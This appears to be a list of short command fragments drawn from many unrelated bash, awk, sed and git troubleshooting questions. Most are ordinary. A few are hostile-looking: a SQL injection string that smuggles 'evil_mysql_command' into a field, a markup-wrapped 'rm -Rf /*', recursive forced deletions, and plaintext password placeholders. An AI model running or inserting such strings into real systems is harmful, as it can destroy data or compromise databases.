if (NR==1) {$3 = "XXXX"};
system('./bash2.sh 2');
system('./bash2.sh 2');
some.php variable1 variable2
$argv[0], $argv[1] .... etc
/usr/bin/vim -> /Applications/MacVim.app/Contents/MacOS/Vim
OS X 10.8.2
GNU bash, version 4.2.39(2)-release (i386-apple-darwin12.2.1)
ruby my_script.rb
bundle install
node myApp.js
kill -15
egrep "first" a.sh && egrep "second" a.sh
$ tr 'A-Z' 'a-z' <be.fore >af.ter
$ tr '[:upper:]' '[:lower:]' <be.fore >af.ter
tr "set1" "set2" < input.txt > output.txt
sed -e 's/\(.*\)/\L\1/g' *
find /path_to_file
-type f
-exec COMMAND '{}' \;
sed --in-place -e 's/\(.*\)/\L\1/g'
watch -n 5 ls -l
while :; do ls -lh | awk '/some*/{print $5}'; sleep 5; done
bash ./while_check.sh &
ls -l | grep "txt"
watch -n 5 'ls -l | grep "txt"'
ls -l
redis-cli keys
man xargs
xargs -d '\n'
[^ -~]
1 or more
echo "…" > /etc/whatever.com
mv [-f | -i | -n] [-v] source target
cmd1 | cmd2 | ...
" differ"
"Files "
" and "
-f -
stty -a
chmod +x <script_name>
$ gvim
ls -all /usr/bin/gv*
firstname+initial of the second name
/usr/sbin/usermod $u -p "$HASH"
python "%f"
&& exit
python "%f" && exit
"./%e" && exit
sqlite3 my_db.db '.read my_file.sql'
ls "'"$file"'"
ls \'$file\'
ls "'$file'"
$ touch /tmp/1
$ ls '/tmp/1'
$ ./tst.sh
'/tmp/1': No such file or directory
'/tmp/1': No such file or directory
'/tmp/1': No such file or directory
.read my_file.sql
ls "'$file'"
eval ls "'$file'"
N > 10^6
-bash: /bin/ls: Argument list too long
^0274:xx3A7B29992A04:<274 bytes>\n
set -e
declare ?=$?
Job <id>: 417/862
$LIBRARIES="abc.so.1 def.so.1 hij.so.3.1"
's/\.so[^ ]*/\.so\*/g'
\.so[^ ]*/
[^ ]*
<<< "$LIBRARIES"
echo "$LIBRARIES" | sed ...
make -s
file1 file2 file3
mv -i $filename "$location1" $location
source ~/.bashrc
diff -r
[[ ... ]]
[ ... ]
[[ ... ]]
[ ... ]
unary operator expected
subprocess.check_call(["java", "-cp", cp_arg, ..., "-someflag somevalue"], shell=True)
subprocess.check_call("java -cp blah blah".split(), shell=True)
for directory in a
-type d
-maxdepth 1
grep "version"
FS=[ \t]+
OFS=' '
cd /usr/local/bin/minecraft/ && java -Xms512M -Xmx2048M -jar minecraft.jar
restore -n
restore -n test1.txt
"Where would you like to save the file?"
restore test1.txt
echo "AAA\nBBB"
var=$(cmd | tail -n +2 | head -n 1)
echo "AAA\nBBB" | awk "NR==2"
Client connected with ID 1234
Client lost
Client connected
Client lost
|column -t
-f FILE
-f File
open somefile.ext
rails s -p3002
CMD INPUT1 [INPUT2 [...]]
CMD -
date +%N
virtualenv /test/a
N = 250
XXX = 001
YYY = 3
for i in {1..250}
$(($RANDOM % 1000))
% 1000
> File${i}.txt
i == i-1
uniq -d
mpiexec  ./main input
while maxIteration < 10
mpiexec ./main input $1 $2
mpiexec ./main input
t=$((1$maxIter+1)); maxIter=${t#1}
[ -f abc ]
while [ ! -f abc ]; ...
until [ -f abc ]; ...
zip -u
awk 'BEGIN{FS=OFS="/"}
{print $6, $7}'
<<< ${string}
input_file.txt > parsed_vars.txt
arr=( )
foo || bar
[[ -d $foo ]] || { echo 'ohNoes!' >&2; exit 1; }
cmd1 && cmd2
C:\Program Files (x86)\WinSCP\WinSCP.com
svn status
ln -s
svn status|awk ...|sh
read -a
0 1 3.88 7.1 _1 + + + + p
"${arr[@]/%/ +}"
1 + 2 + 3 +
1 + 2 + 3 + 0
$(( "${arr[@]/%/ +} 0"))
arr=(1 0 1)
if [[ $((${arr[@]/%/ &} 1)) -eq 1 ]]; then echo "yes"; else echo "no"; fi
arr=(1 0 0)
if [[ $((${arr[@]/%/ |} 0)) -eq 1 ]]; then echo "yes"; else echo "no"; fi
find /reports -type f | xargs ls -lt
head -n 1 or head -1
ERROR 1064 (42000) at line 3: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'FIELDS TERMINATED BY "\t"' at line 10
mv: missing file operand
mv -i $filename $restore
ps wax | grep node
elif [[ "$counter" -gt 20 ]]; then
[[ "$counter" -gt 20 ]]
let counter++
let counter++
./wrap_app.sh --run-new-arg
which_repo address/to/file.js
svn blame cvs/myrepo/address/to/file
$(( ... ))
$  sh -x test.sh
sh -x test.sh
sh -x test.sh
-l depth
wget  --mirror  --page-requisites -np --convert-links -P /Folder-local http://domain/sub1/index.php
wget -r -np http://domain/sub1/
bash array
[[ ... =~ ... ]]
crontab -e <enter>
rm /tmp/*
aa ab aa ac aa ad
sort | uniq
sort -u
read -a
IFS=" " read -r -a ids <<< "$(echo "${ids[@]}" | tr ' ' '\n' | sort -u | tr '\n' ' ')"
IFS=" " read -r -a ids <<< "$(tr ' ' '\n' <<< "${ids[@]}" | sort -u | tr '\n' ' ')"
tr ' ' '\n'
sort -u
tr '\n' ' '
tr ' ' '\n' <<< "${ids[@]}"
echo "${ids[@]}" | tr ' ' '\n'
NewArray=( $(printf '%s\n' "${OriginalArray[@]}" | sort -u) )
cat number.txt | awk '{for(i=1;i<=NF;i++) print $i}'
cat number.txt | awk '{for(i=1;i<=NF;i++) print $i}' |awk 'x[$0]++'
cat number.txt | awk '{for(i=1;i<=NF;i++) print $i}' |awk '!x[$0]++'
cat number.txt | awk '{for(i=1;i<=NF;i++) print $i|"sort|uniq -u"}
wget -q -O - https://raw.github.com/aaronhancock/pub/master/bash/readtest.sh
[[ ... ]]
myPython.py | myBash.sh
python -c 'print "foo"' | cat
sh -vx
mvn clean
echo "Maven Clean Unsucccessful!"
$(mvn clean)
mvn clean
mvn clean
iptables -L -n
echo -e
# do things and print
ls -l
ls -l
ls -l
help mapfile
>> ~/.ssh/config
perl -ne
means, '*run the given script once per line*' - so
/^alias ../
perl -ne
< ~/.bash_aliases
${FILE% (*}
/bin/bash -c myscript.sh
arrays A, B, C
array C
exec 2 >
>( )
bash mage-install.sh blah blah blah
which bash
while read
seq N+1
(( ))
echo -e "A\nB"
myvar="${myvar// /}"
set -f
sed 's/ //g'
tr -d ' '
s/^[E ]*//
shopt -s extglob
ps -e|grep tail
tail -F
tail -F
find $1 -type f -name 'filename.txt' | xargs fgrep LINE_TXT
-r --include
grep -r
stop <x> service
service ourservice stop
-type f
-name "*.txt"
-exec ... \;
python2.7 ../getDOC.py {};
sleep 10
ps -p $!
pstree $$
myprog &
BASH_ENV=~/.profile bash -O expand_aliases -c la
cd "$1" || <do something as the cd failed>
kill -9
printf '%q\n' $(set | grep "suffix=") > save_file
printf '%q\n' $(set | grep "^prefix") > save_file
help printf
World of Warcraft
help read
[: ==: unexpected operator
[: ==: unexpected operator
if [ == ]
kill %1
kill %2
wget -O usa_stock.html "http://markets.usatoday.com/custom/usatoday-com/new/html-mktscreener.asp#" | java -jar tagsoup.jar usa_stock.html
pushd "$(pwd)"
if errorlevel 1
if errorlevel 0
gem environment
- GEM PATHS:
GEM PATHS
echo "" > fifo_file
id;pwd;ls -ld $fifo
ps faux
strace -p <PID>
lsof -p <PID>
lsof | grep <NODE>
which sh
prog1 file.txt | prog2
if($0>max) max=$0
END{print sum[max]}
uniq -c
uniq -c
Working directory
Working directory
User ID=myuser;Password=secret
sort -u
exit 0
push origin master
git push origin master
git push
Missing required parameter: client_id
vim ~/.bas
exit 1
die() { }
function die {}
source ~/.bashrc
source ~/.bashrc
[[ $- == *i* ]]
tr A-Z a-z < file | tr -sc a-z | sort uniq -c wc '\n'
python a.py
python b.py
python a.py
python a.py
echo -e "\E[31m[ERROR]\E[m"
prompt_ok() {
echo -e "\E[32m[OK]\E[m"
status() {
if [ $1 -eq 0 ]; then
exit -1
read -a
-x /home/nico/extract.txt
> /home/nico/extract.txt
<name_1>.html <name_2>.html ... <name_n>.html
\,^/, s,/,:/,2
\,/$, !s,$,/,
source <file>
. .profile
source profile.txt
source profile.properties
. ./profile.txt
. ./profile.properties
echo $PATH
man date
-starttls imap
tee -a
tail -f cmds
'BEGIN{FS="[ ,]"}
{print $1, $2, $NF; print $1, $3, $NF}
mv -i
[remote "origin"]
@Spencer Rathbun
require ftools
-r library     Causes Ruby to load the library using require.  It is useful when using -n or -p.
pkill -f
touch .bash_profile
vim .bash_profile
git config core.editor notepad 
notepad .bash_profile
File>save 
New-Item $profile -Type File -Force
notepad $profile
$bash = [bash | . ~/.bash_profile]
source ~/.bash_profile
git clone $repo
repository successfully cloned
repository cloning failed
git clone
git clone user@server:repo localrepo > git.log 2>&1
> git.log
$? eq 0
cat git.log
git diff-tree
git diff --quiet
git diff --exit-code
git diff --quiet
while read ...
git diff-tree
git diff --name-only
shard_path_array=( \$(find . -name \"shard0\") );
cd \${shard_path_array[0]}
(head; tail) < file
cat file | (head;tail)
(head; wc -l) < file
cat file | (head; tail)
(head; tail) < file
(head; tail) < file
cat file | (head; tail)
(head; tail) < /tmp/file
{ head; tail; } < file
7z a -tzip abc.zip -w abc/.
-w abc/.
brew install p7zip
ctags -R *
Argument list too long
echo $var
-type f
-type d
wc -l
for item in $LOCATION/*
[ -d $LOCATION ]
$(( ... ))
FILECOUNT=$(( FILECOUNT + 1 ))
... am wondering if there is a simpler way of doing it.
man wc
wc -l --files0-from=-
NUL-terminated  names
find . -type f | wc -l
find ./*/*/*/*/*/*/TOC  -type d | wc -l
df -h
service httpd status
df -h
which jobs
sudo apt-get jobs
jobs -p
help jobs
echo a b c
sh( )
su - postgres
su -c 'command1; command2...' - postgres
ls -l */
ls -l */; ls -l
/Volumes/ADATA\ UFD/Programming/Qt
/Volumes/ADATA\ UFD
/Volumes/ADATA\ UFD/Programming/Qt
man cp
find . -maxdepth 2  -type f
-exec ls -l {} \;
ls -l
./script.pl a b
grep -v
GNU sed
git pull 1>&1 | grep "Already up-to-date." && $?
Already up-to-date. 0
Branch is moved
git pull
find ... -print0 | xargs -0
find ... -exec
ct ls
wget --user=someuser --password=plain_text_password
scp -r
tar -t
prog1 | prog2
prog1 | prog2 | <convert X to decimal> | <multiply by 2>
hex "$_"
chmod u+rx sleep.sh
os.chmod('sleep.sh', 0o755)
OSError: [Errno 2] file not found
subprocess.call("sleep.sh 10")
subprocess.call(["sleep.sh", 10])
echo "test"
echo "test"
echo "test"
test ...
[ ... ]
[[ ... ]]
(( ... ))
if list; then list; [ elif list; then list; ] ... [ else list; ] fi
echo $num2
find . -name "*" -printf "put %p\n"
"put %p\n"
awk -f split.awk test.list
find /tmp -name 'twofirmscoop.so' -o -name 'twofirms.so' -exec ls -lt {} + 2>/dev/null
sed -n '/\['$i'\]/,/\[/{/^\[.*$/!p}'
echo test
bash -c 'bash 2>&1'
read ver
chmod 775
./script.sh one two three
cat my450klinefile.txt | myscript
cat my450klinefile.txt >/dev/null
while read
while read
netstat -i | tail -n +3
help mapfile
set +m
set +m
read A B
read A B
echo $A-$B
A | B
cat myfile | myreader
sleep_time = 0
sleep_time = 1
[[ "$p" == */* ]] || p="./$p"
ant debug
ant debug
man ant
ant debug
ant debug
%d %lf %lf
find posns -type f
-exec ... \;
split -l 10000 {}
split -l 10000
command date
cat <<EOF
one=($(w | tr -s " " | cut -d" " -f1 | tail -n+3))
echo ${one[1]} ${one[2]}
s(for substitute)/string_to_match/new_string_or_empty_to_remove/g(for global/all document)
sed 's/\"PROVISIONING_PROFILE\[sdk=iphoneos\*\]" = \"22B333C5-6D7A-4A76-81F2-12A045DAE44C\";//g'
[ "$name"=="hdmi" ]
./genMandelbrot > Mset
./genMandelbrot 100 50 > Mset
arp -a
arp -a
man 5 proc
( )
man ssh
man ssh_config
sh -c command
sudo cat add_file
man sudo
sudo sh -c "cat add_file >> /etc/file"
bash open square bracket colon too many arguments
new test
new test
[: unary operator expected
[: unary operator expected
[: too many arguments
[: unary operator expected
test: too many arguments
test: unary operator expected
[ ... ] && [ ... ]
[ ... -a ... ]
[: too many arguments
[: a: binary operator expected
foo.sh arg1
foo.sh arg1 arg2
[ -z arg1 arg2 ]
[ "$#" -eq 0 ]
/path/to/script arg arg
VAR=$(/path/to/script arg arg);
sbin/service solr [action]
sbin/service solr start
sbin/service solr start
VAR=$(sbin/service solr start);
sbin/service httpd start
VAR=$(/sbin/service solr start);
VAR=$(source /sbin/service solr start);
VAR=$(nohup /sbin/service solr start &);
VAR=$(/sbin/service solr start >> /dev/null);
/sbin/service solr start
VAR=$(/sbin/service httpd restart);
strace -f -o strace.out /path/to/script
ps -p
25664 close(67)                         = -1 EBADF (Bad file descriptor)
25664 close(1023)                       = -1 EBADF (Bad file descriptor)
25664 open("/dev/null", O_RDWR)         = 3
sed -n 3p
sed -n 3,10p
sed -n '3{p;q}'
awk '...'
FNR==3 {print; exit}
while (( ${i:-1} <= 3 ))
(( $i == 3 ))
read -r line
(( i++ ))
done < file.txt
man sh
sh foo
sh test.sh
sh test.sh
kill -9
info cut
find . -maxdepth 1 -type f -regextype posix-extended -regex ".{255,}"
mv -n "$filename" "${filename:0:50}"
cat -n
jpegtopnm|ppmtoy4m -F 4:1| x264 --crf 24 -o ../xx.mp4 --stdin y4m -
awk '...'
/^#EOF$/ {do_print=0}
do_print {print > ("target_"f_index".sh")}
/^#SOF$/ {do_print=1; f_index++}
l {}
if (l==1) {}
[[ ... ]]
mysql --help
php -f generate_key.php
awk -v VAR=VAL
git clone
exit 1
export myPath="/home/user/dir"
totalcomsize, totalp, pol_pla, nvp_vp
[1, 2, 3, 4, 5]
>Drosophila Melanogaster
[0.2, 0.4, 0.6]
totalcomsize, totalp, pol_pla, nvp_vp
xargs ls -1
cat | tr 'a-z' 'A-Z'
find /bad/path | xargs ls -l
XML starlet
repo forall -c '....$variable'
brew install
< /dev/null
set -e
read -r
< $FILENAME
read -u 9
< $FILENAME
9< $FILENAME
Expect tool
self._vte.fork_command_full(Vte.PtyFlags.DEFAULT, None, [Vte.get_user_shell()], None, GLib.SpawnFlags.SEARCH_PATH, None, None)
self._vte.fork_command_full(Vte.PtyFlags.DEFAULT, None, [Vte.get_user_shell(), "-l", "-i"], None, GLib.SpawnFlags.SEARCH_PATH, None, None)
[[ -s "$HOME/.rvm/scripts/rvm" ]] && source "$HOME/.rvm/scripts/rvm"
PATH=$PATH:$HOME/.rvm/bin # Add RVM to PATH for scripting
ls -la
/ +/
ls -la some_file | awk '{print $5}'
tr -s ' '
printf ${2+-v} $2 "%s${n[${2+2}]}" "$v"
find "error_file_dir" -mtime 7 -name "error_file"
declare -p
date +"%m-%d-%Y/%T"
-v VAR=VAL
-v var=val
su  - postgres
su - postgres
make install
grep -Po '(?<=1).*(?=Pending)' file
sh script.sh
>> log.log
* * * * * /root/script.sh
. FILENAME
shopt -s extglob
lsof -i TCP:"$port" -s TCP:LISTEN
set -e
sed -i '1i# Autogenerated file, do not edit' my.cnf
ps -A -ocmd
chmod 0600 ~/.my.cnf
mysql -e "SHOW DATABASES"
netstat -na
eval "$(./word)"
./word > file
[ condition ]
t ls
t ls -l
Unknown option: `-l' Usage: tcsh ...
${(j. .)…}
copy C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe ProjectPath
open -a TextEdit ~/.profile
dir env:
dir env:
var=(first second third)
sed -i "" -e "s/\$\$placeholder\$\$/$o/g" test.txt
col -b
else if
else if
echo "b"
host@name "B=3; echo 3; echo ;"
B=3; echo $A; echo $B;
echo $B
echo "1.0074E+05" | awk -F"E" 'BEGIN{OFMT="%10.10f"} {print $1 * (10 ^ $2)}'
shopt -s expand_aliases
p4cli login
which ghc
which ghc
type ghc
hash -r
GNU grep
O_CREAT | O_EXCL
mv -n random desired
O_CREAT | O_EXCL
mv -n
stuff 'printf "stop/r"'
screen -x $PROCESS
ctrl-A & ctrl-D
stuff printf
screen -x $PROCESS
mpstat -u 1 -P ALL
while :; do
$(mpstat -P 1 | tail -n 1)
-P 1
-n 1
arr=( ... )
echo "${arr[3]}"
sleep 20
>> file.txt
_mpstat &
echo "_mpstat PID: $!
ls file* | sort -V
man bash
 
dos2unix "$file"
rm $TMPFILE
$(tar -czvPf ${folder_backup}/rajal/backup.tgz -C /var/www/tmk/app .)
./test: line 47: ./: Is a directory
Why do you have $( ) around the tar?
foo 4 123
$( )
xargs -r
date +%d%m%Y
sed -i 's/search_regexp/replacement_string/' *.xml
man sed
! -type l
read -a
$qry2)); 275
$qry1)) { 147
ls *.c
crontab prod.cron
cat -n
echo ${line/([0-9]*)/($COUNT)};
awk '$2!=1 && $3 != 0' file
$2 == 1 && $3 == 0
awk '$2$3!="10"' file
. ./myScript.sh
java RandomTest
-o FILE
java RandomTest
for line in $sentence
while read
>>"$(tr A-Z a-z <<<"$company").txt"
cp filepath(and filename) serverpath
source "/usr/local/bin/virtualenvwrapper.sh"
pip install virtualenvwrapper
echo "source /path/to/virtualenvwrapper.sh" >> ~/.profile
export WORKON_HOME=(directory you need to save envs)
source /usr/local/bin/virtualenvwrapper.sh -p $WORKON_HOME
which virtualenvwrapper.sh
source /usr/local/bin/virtualenvwrapper.sh
mkvirtualenv: command not found
find / -name virtualenvwrapper.sh
You have found your missing file!
which virtualenvwrapper.sh
source ~/.local/bin/virtualenvwrapper.sh
sleep 1000
-option "1 2 3"
one two three
-O -
> somefile.txt
tail -f logfile | grep 'foo bar' | awk ...
git pull
ls --color=always
git pull --stat
git pull
$ env TERM=xterm-color git pull --stat
./printb/imprimirFormPlano.bin 1 2 FILE.PS Cola1
-type d
-ctime +10
-exec ... \;
rm -rf {}
-mindepth 1
-maxdepth 1
-mindepth 1
-maxdepth 1
-maxdepth 0
rm -rf
-maxdepth 0
exit 1
set -e
exit 1
world 12
local network
[: Y: unexpected operator
jruby -S rake db:migrate
jruby -S rake db:migrate > migrate.out
jruby -S rake db:migrate >> migrate.out 2>&1
echo -n
data='Type=Eatable Fruits="Apple Orange"'
sh print.sh $data
sh print.sh $data
dhcpd -tf /path/to/dhcpd.conf
-tf /path/to/...
head -1 file1 file2 file3 file4 ...
==> file1 <==
bash script/python/perl script
302 is missed
echo 302
echo "input"
cat -
ls | cat - <(echo new line)
/TOM/Process Folders/System Drive/a.jpg
-a -
sed 's/$/\r/'
<<!\n ... \n!
-p ""
echo -n
git stash --include-untracked --keep-index
git stash pop
git stash pop
git reset --soft HEAD~
git clean
git stash pop
git stash pop --index
git checkout stash -- .
git stash drop
git merge --squash --strategy-option=theirs stash
git stash && git stash pop stash@{1} && git stash pop
git status -z | egrep -z '^[AR]D' | cut -z -c 4- | tr '\0' '\n'
git stash --keep-index --include-untracked
git status --porcelain | egrep --silent '^(\?\?|.[DM])'
awk '{for(i=1;i<=length;i++) print substr($0, i, 1)}' /home/cscape/Desktop/table2.sql
named x.awk
man bash
bash v4.3
bash script
$(cat $1 | wc -c)
{ }
exit 1
( )
fang fang fung fung
fang fung fung fung
./function input > output.txt
./function input output.txt
setvbuf(stream, (char *) NULL, _IOLBF, 0);
./function input output.txt
whatever','something'); evil_mysql_command; whatever
inotifywait ...
gtk-redshift -l -31.9530044:115.8574693
sudo useradd -m username
sudo useradd -d /home/username -m username
php newuser.php
ls -lrth | grep TRACK
| cut -f1 -d' '
man date
man date
ssh user@server 'simulation/script'
man at
man 1 sleep
ssh user@server 'simulation/script'
ssh server 'nohup yourscript.sh &'
screen -d -m yourscript.sh
ssh server.com 'screen -d -m ~/myscript.sh'
man at
nohup bash -c 'sleep 5 && at now -f script-name.sh'
rvm --version
killall -9 syncapp
dirname -ksh
dirname 'sh'
man dirname
dirname sh
dirname $0
dirname -ksh
echo $EGG | hexdump
0x08, 0x09, 0x0a, 0x0b, 0x0c ...
77.6 GB
525 mn
1 every 3^5
NR % 243
2.16 mn rows
59 seconds
sed -i 's/AAAA/BBBB/g'
?Invalid command.
echo "$fileout" > $5
kill 0
{ sleep 1s; kill 0; }
man rm
$myvar = secure.XYZ.ab.mydomain.com
which passenger-install-apache2-module
grep + sed
git rm
git filter-branch
git rm
Unexpected token fi
GNU bash, version 4.2.39
ssh -t
tail -f
tail -f
tail -5 -f
tail -F
lftp sftp://$USERNAME:$THISPASS@$URL -e "get $FILEFULLNAMEA $FILEFULLNAMEB $FILEFULLNAMEC $FILEFULLNAMED $FILEFULLNAMEE $FILEFULLNAMEF $    FILEFULLNAMEG $FILEFULLNAMEH; bye"
lftp -f
Enter the path to the file: ~/Desktop/Hello\ My\ Name\ is\ Oliver/
while read
while read -u
cp -t
seq 1 5
while read
cat |
| while ... ;done
help read
for reading 
while read
while read ...;done <file.txt
exec {varname}</path/to/input
xargs -a file.txt -n 1 -I {} chmod 775 {}
man bash
./startlogging.sh &
read -p
cat <<EOF | at ...
at <time> <<EOF
while (1) { }
ps aux | grep username
at -c
Ubuntu 12.10
at -c 1
-A 5
-B 4
-C 1
echo "$var"
<sometag param='
GNU grep
echo $sup
echo $sup
find ./ -name "target_file.txt" -exec cp -r {} $dir \;
find ./ -name "target_file.txt" | head -1 | xargs -I {} cp -r {} $dir/
\$2 == \"$module\"
print \$1
ps aux | grep sshd -p <port>
kill <pid>
setuid bit
grep -c "xyz" filename
grep -c xyz
grep -F
GNU awk
Windows XP IE7
[[ "$i" = *_* ]]
"${i//_/ }"
no clobber
for i in *.mp3
shopt -s nullglob
shopt -s failglob
[[ "$i" = *_* ]]
echo $qsubFile
sed -i '/qsubFile=/c\qsubFile="'"$qsubFile"'"' write.sh
"$DIR1" "$DIR2"
-type f
-name "$FILE"
xx_xxxx_EN.html xx_xxxx_IT.html
grep . file*
-o auto
grep -F
man find
man identify
-P 4
find -type f -name "Makefile"
-exec awk 'FNR==235 {print FILENAME; print}' {} +
grep -nH
man test
man bash
echo "$firstPart -"
firstPart=$(echo "$SOMESTRING" | sed -r "s/'(.*)','(.*)','(.*)'/\1/" )\r
find: missing argument to -exec'
command 2> sample.txt
echo "" > sample.txt
crontab -e
touch {a,b,c}
touch {a,b,c}x
echo {a,b,c}
pear channel-discover
-type f
#!/bin/bash -x
source /path/to/rvm/scripts/rvm
-t "foo \" bar"
-t "foo \"
[ ]
[[ ]]
( )
( )
xidel '<a href="{$link:=., $user := filter($link, www.youtube.com/user/(.*)\', 1)}" class="yt-uix-sessionlink yt-user-name " dir="ltr">{$name}</a>*'
( ... ) &
grep -l
man grep
gunzip file.tar.gz
grep -l
grep -l
tar --to-command grep
tar -tzf
tar -tzf
tar -xzf
basename $TAR_FILENAME
basename $TAR_FILENAME
targrep.sh [-d <start date>] [-f <filename to include>] <string to search for>
targrep.sh -d "1/1/2019" -f "*vehicle_models.csv" ford
tar --to-command grep
tar -O
grep -oE
done < <(
while read -r line
unset ARR[${#ARR[@]}-1]
for db in $mydbs; do echo "$db"; done;
for asdf in blah; do something; done
2>&1 |
printf "\033]0;%s@%s:%s\007" "${USER}" "${HOSTNAME%%.*}" "${PWD/#$HOME/~}"
bash -x
set -x
set -x
set +x
set -x
set +x
PS4='+ '
set -x
-maxdepth 1
PATH_TO_SUBL="/Applications/Sublime Text 2.app/Contents/SharedSupport/bin/subl"
[[ -x $PATH_TO_SUBL ]]
alias subl=$PATH_TO_SUBL
PATH_TO_SUBL='/Applications/Sublime\ Text\ 2.app/Contents/SharedSupport/bin/subl'
[[ ... ]]
[ ... ]
Hello World
Hello World
'HELLO=Hello World'
HELLO='Hello World'
HELLO='Hello World
'echo $HELLO'
echo $HELLO
Hello World
echo 'Hello World'
'HELLO=Hello World'
HELLO='Hello World'
a=abc cmd
env a=abc cmd
var = ( $LINE )
cd /Applications; ls | grep Adobe
apps=( $(ls | grep Adobe) )
add .bak extension
/bin/mv ... .bak
FS=","; OFS="|"
awk -F, '{"date -d "$date" +%s" | getline columns[4]}'
c[4]=$(date ...)
//title | //whatothertagsyouwant
<rm>-Rf /*</rm>
read str
" "
wc -c
cut -c $len-1
tr -dc $last
wc -c
1 day
How do I pass stdin to a bash function?
read in
type zip
${n?error message}
${3?error message}
Macbook Pro
Mac OS X Lion 10.7.5
source ~/.bash_profile
echo $PATH
man screen
Control + A
screen -x
screen -D -R
screen -x
ruby vanilla.rb some options
vanilla some options
#!/usr/bin/env ruby
echo $((26*26)) -> 676
pwgen -1A0B 2 10000
#!/usr/bin/env node
echo "$message" > $madrid_pipe
man 7 pipe
$cmd = 'find '.$folderPath.' -path \'*/.svn\' -prune -o -type f -exec rm {} +';
cut -d' ' -f2-
awk '{$1=""; print $0}'
^(?:\((?:\+44\d{4}|\d{5})\)|\+44\d{3}|\d{5}) ?\d{6}$
cat-n file
echo-e foo
test -n
if [ -n "$answer" ]; then
[[ -n "$srv" ]]
echo $MYENVVAR
eval 'echo...'
a=aaa echo $a
function blah
export CPIC_MAX_CONV
printf $"%s, %s,\n%s" some thing more
msgid "%s, %s,\\n%s"
echo $"\`"
msgid "\\`"
[ -n "${G_FILE}" ]
[ "${G_FILE}" ]
[ "${G_FILE}" != "" ]
[ -r "${G_FILE}" ]
iptables -A
iptables -I
sudo -u postgres psql
sudo -u postgres initdb -D /usr/local/pgsql/data
export PATH=$PATH:/usr/lib/postgresql/bin
/etc/init.d/postgresql status
Running clusters: 9.1/main
char <backspace> char
_ <backspace> char
od -c afile | less
find . -cmin 1
find . -ctime 2 /*or 3,4...*/
date -d'-5minutes' +%m%d%H%M
date -d
php -r 'file_put_contents("schema.sql", preg_replace("/(,\s+FULLTEXT KEY [^)]+\))/", "/*$1*/", file_get_contents("schema.sql")));'
cd folder_name
chmod XXX file_name
-f ~/${1}/$file
-t ~/${1}
-name "$1" -prune
cp -n
cp -i
/bin/bash test.sh
/bin/sh ./test.sh
/bin/bash ./test.sh
/bin/sh ./test.sh
test.sh: not found
/bin/bash ./test.sh
/bin/sh test.sh
pip install jq
["A=1 2", "B=3"]
A=1 2
-T 5/insane
ping -c 5 -b 10.10.0.255 | grep 'bytes from' | awk '{ print $4 }' | sort | uniq
fping -ag 192.168.1.0/24
open $cmdHandle,"bash -c ... |"
perl -e '...'
perl -e "..."
| head -$line | tail -1
mv file3 file1
head -n 16 file1
tail -n+56 file1
which awk
. panic
source panic
man source
-----THIS STUFF IS USELESS-----
-----THIS STUFF IS USELESS-----
-----BEGIN PGP SIGNATURE-----
GNU sed
^(?:(?!Files:).)+|\s*-----THIS STUFF IS USELESS-----.+
awk '{print}' blah.c
eval echo $x
a backlash, a zero, a 3, etc.
echo -e
` $'...' `
2012-12-01,2012-12-02 ... 2012-12-31
2012-12-01,2012-12-02 ... 2012-12-31
2012-12-01,2012-12-02|2012-12-03 ... 2012-12-09|2012-12-10 ... 2012-12-16|...|2012-12-31
shopt -s compat32
help break
man inotify
return 1
set -vx
echo ${#backupitems[@]}
{ .... ; }
.script --first2012-12-25 --last2012-12-26
0 to ($# - 1)
for arg in "$@"
i=0; while [ $i -lt $# ]; do
--startdate 2012-12-25 --enddate 2012-12-29
for each
-s ','
man isql
exec > >(tee $LOGFILE); exec 2>&1
> /dev/null
echo $test_var
export COLOR tty
$( echo eval "ls | head -1" )
"eval ls | head -1"
bash~> $( echo eval "ls | head -1" )
eval ls | head -1
man dos2unix
# 
#one two 12
# 
# 
# 
# encoding: UTF-8
SECTION - PAY 500
SECTION - Pay 400
{ /$END/! d; }
sed "/$END/ p; /$START/,/$END/ d;"
if ; then
[ -f $SOME_PID_FILE ]
[ -f $SOME_PID_FILE ]
sudo yum
mxterminator jmx< engcorpus.txt
man mkfifo
head -c -1
git push
git push
git push
git push
echo 1 > /proc/sys/net/ipv4/ip_forward
|| true
grep -q
kill $(cat $PIDFILE)
grep -i ".$extension$"
find /?
findstr /?
git read-tree HEAD
git read-tree HEAD
git stash
git stash
git read-tree
git stash
git add --interactive
git stash
git write-tree
git stash
git stash
kill $!
-C tail
--ppid $!
ls db/migrate/*.rb | tail -n 1
ls db/migrate/*.rb | tail -n 1
if $realip
echo $STRING
tail -n 1
free -mo
head -2
tail -1
free -mo -s 30 &> test.txt &
SET GLOBAL slow_query_log_file='$new_log_filename'
stat -Lc
stat -c
chmod 4755 file-name
alias wbyu='_(){ local -i FND=0; if [[ $# -eq 2 ]]; then for each in $(groups "$1" | awk "{\$1=\"\";\$2=\"\"; print \$0}"); do (($(find "${2}" \( -perm /220 -o -group "$each" -a -perm /g+w \) 2>/dev/null | wc -l))) && FND=1; done; else echo "Usage: wbyu <user> <file|dir>"; fi; (($FND)) && echo "Eureka!"; }; _'
cmd1 && cmd2
sed -i
tail -n 100
tail -n +100
for (i=1;i--;));do read;done
help mapfile
source "$HOME/.bash_prompt"
source ~/.bashrc
cut -c
cut -c 1,3,5,7
cut -c 2-8
man cut
awk '{print $5,$6,$7,$8,$3,$4,$1}'
grep "a certain string" 200901*/*.csv
$ (< answer.txt)
$ (cat answer.txt)
trap '' PIPE
LEFT JOIN
CROSS JOIN
Notice: unserialize(): Error at offset 326 of 1551099 bytes in reallylongfilename.php on line
alias alias_name=""
svn update
svn update
At revision ...
Conflict discovered in ...
meld some_file.r123 some_file.mine some_file.r124
meld MY BASE THEIR
svn resolve --accept 'my-full FILENAME'
svn help resolve
svn resolve
set hidden
:bufdo! w
set hidden
set autowrite
:set hidden
sort $1 | uniq
sort -u $1
awk -F=
cut -d= -f1
git branch
set xtics
help set format
help set stats
show variables all
subprocess.call(['/home/lukasz/bashdate.sh', year, month, month_name])
cat ... rm
y=$1; m=$2; mn=$3
this ( is my ) simple example
this (_is_my_) simple example
awk '...'
{$4=$4+4; print}
> output
my .sh
ENV=$1 RELEASE_ID=$2
set scan on
git log | head -n 1 | awk '{print $2}'
for i in $(cat /data/datafile)
while read
fgrep -r
grep -f find_this
$ ls
$ grep 'foo'
grep 'foo'
git pull
$(cat file)
$(< file)
pythonprog.py "$argument"
tr '\n' '\0' <filelist.txt
xargs -0
sed 's/^.*is:an.*$//'
cat temp.txt | sed 's/ /\\ /g'
